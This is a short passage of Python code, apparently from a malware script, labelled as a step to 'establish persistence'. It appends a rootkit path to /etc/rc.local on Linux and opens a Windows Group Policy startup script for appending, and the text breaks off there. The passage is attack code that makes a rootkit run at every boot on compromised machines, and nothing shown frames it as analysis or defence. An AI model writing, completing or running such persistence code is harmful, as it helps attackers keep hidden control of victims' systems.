    # Step 4: Establish persistence
    if os.name == 'posix':  # Linux
        with open('/etc/rc.local', 'a') as f:
            f.write(f'\n{rootkit_path}\n')
    elif os.name == 'nt':  # Windows
        with open(r'C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\startup.bat', 'a') as f:
